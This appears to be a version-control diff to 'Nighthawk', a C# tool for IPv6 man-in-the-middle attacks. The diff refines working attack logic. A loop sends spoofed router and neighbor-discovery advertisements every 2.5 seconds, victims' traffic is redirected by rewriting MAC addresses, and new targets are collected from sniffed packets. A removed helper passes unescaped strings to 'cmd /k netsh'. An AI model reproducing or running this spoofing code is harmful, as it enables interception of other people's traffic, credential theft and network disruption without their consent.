@@ -88,10 +88,9 @@ namespace Nighthawk
         {
             SpoofingStarted = false;
 
-            // stop threads & send correct gateway
+            // stop threads & send correct gateway (not implemented)
             if (workerSender != null && workerSender.IsAlive)
             {
-                ReSendGateway();
                 workerSender.Join();
             }
 
@@ -100,41 +99,6 @@ namespace Nighthawk
             
             PacketQueue.Clear();
             PacketQueueRouting.Clear();
-        }
-
-        // static ND entry manipulation (IP, MAC, friendly interface name, add/remove)
-        public bool StaticND(string IP, PhysicalAddress mac, string WinName, StaticNDOperation operation)
-        {
-            OperatingSystem system = Environment.OSVersion;
-
-            // format MAC
-            var macString = Network.FriendlyPhysicalAddress(mac).Replace(":", "-").ToLower();
-
-            // prepare process
-            Process p = new Process();
-
-            p.StartInfo.CreateNoWindow = true;
-            p.StartInfo.UseShellExecute = false;
-            p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
-            p.StartInfo.FileName = "cmd";
-
-            // Vista, Windows 7 - "netsh"
-            if (system.Version.Major > 5)
-            {
-                // set parameters
-                if (operation == StaticNDOperation.Add)
-                    p.StartInfo.Arguments = "/k netsh interface ipv6 add neighbors \"" + WinName + "\" " + IP + " " + macString + "";
-                else
-                    p.StartInfo.Arguments = "/k netsh interface ipv6 delete neighbors \"" + WinName + "\" " + IP + "";
-
-                p.Start();
-                p.WaitForExit();
-
-                return true;
-            }
-
-            return false;
         }
 
         // create a fake RA packet (network prefix)
@@ -175,34 +139,28 @@ namespace Nighthawk
             return (EthernetPacket)Packet.Parse(bytes);
         }
 
-        // send correct RA back to targets and ND advertisements to the gateway
-        private void ReSendGateway()
-        {
-            return;
-        }
-
         // worker function for sending RA packets
         public void WorkerSender()
         {
-            // 86 bytes for ND, 166 for RA ?
-            var sendQueue = new SendQueue(IPv6toMACTargets.Count * 86 + 166 + 512);
-            
-            sendQueue.Add(GenerateRouterAdvertisement(prefix).Bytes);
-            
-            foreach (var target in IPv6toMACTargets)
-            {
-                // send spoofed ND advertisements to the gateway
-                sendQueue.Add(GenerateNDAdvertisement(target.Key).Bytes);
-            }
-
             while (SpoofingStarted)
             {
-                sendQueue.Transmit(device, SendQueueTransmitModes.Normal); 
+                // we need to generate packets inside the loop, because IPv6toMACTargets can change (86 bytes for ND, 166 for RA ?)
+                var sendQueue = new SendQueue(IPv6toMACTargets.Count * 86 + 166 + 512);
+
+                sendQueue.Add(GenerateRouterAdvertisement(prefix).Bytes);
+
+                foreach (var target in IPv6toMACTargets)
+                {
+                    // send spoofed ND advertisements to the gateway
+                    sendQueue.Add(GenerateNDAdvertisement(target.Key).Bytes);
+                }
+
+                sendQueue.Transmit(device, SendQueueTransmitModes.Normal);
+
+                sendQueue.Dispose();
 
                 Thread.Sleep(2500);
             }
-
-            sendQueue.Dispose();
             
             return;
         }
@@ -241,17 +199,26 @@ namespace Nighthawk
 
                         var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));
 
-                        // get IPs
                         var sourceIP = ip.SourceAddress.ToString();
                         var destinationIP = ip.DestinationAddress.ToString();
 
-                        // get MACs
-                        var sourceMAC = ethernetPacket.SourceHwAddress.ToString();
                         var destinationMAC = ethernetPacket.DestinationHwAddress.ToString();
 
                         if (sourceIP == deviceInfo.IPv6 || destinationIP == deviceInfo.IPv6) continue;
 
-                        // incoming packets - change destination MAC back to target's MAC
+                        // skip local network traffic
+                        if (sourceIP.Contains(prefix.Replace("::", ":")) && destinationIP.Contains(prefix.Replace("::", ":"))) continue;
+                        
+                        // check for IPv6 - MAC entry existance (check only addresses from this network) and add it if necessary (we need this because scanner cannot pick up IPv6 addresses of all the targets)
+                        if (sourceIP.Contains(prefix.Replace("::", ":")) && !IPv6toMACTargets.ContainsKey(sourceIP) && !sourceIP.Contains("fe80::"))
+                        {
+                            lock (IPv6toMACTargets)
+                            {
+                                IPv6toMACTargets.Add(sourceIP, ethernetPacket.SourceHwAddress);
+                            }
+                        }
+
+                        // incoming packets (internet -> nighthawk) - change destination MAC back to target's MAC
                         if (IPv6toMACTargets.ContainsKey(destinationIP) && (destinationMAC != IPv6toMACTargets[destinationIP].ToString()))
                         {
                             ethernetPacket.SourceHwAddress = physicalAddress;
@@ -260,7 +227,7 @@ namespace Nighthawk
                             if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                         }
 
-                        // outgoing packets - change destination MAC to gateway's MAC
+                        // outgoing packets (targets -> nighthawk) - change destination MAC to gateway's MAC
                         if (IPv6toMACTargets.ContainsKey(sourceIP) && (destinationMAC != IPv6toMACTargets[prefix].ToString()))
                         {
                             ethernetPacket.SourceHwAddress = physicalAddress;
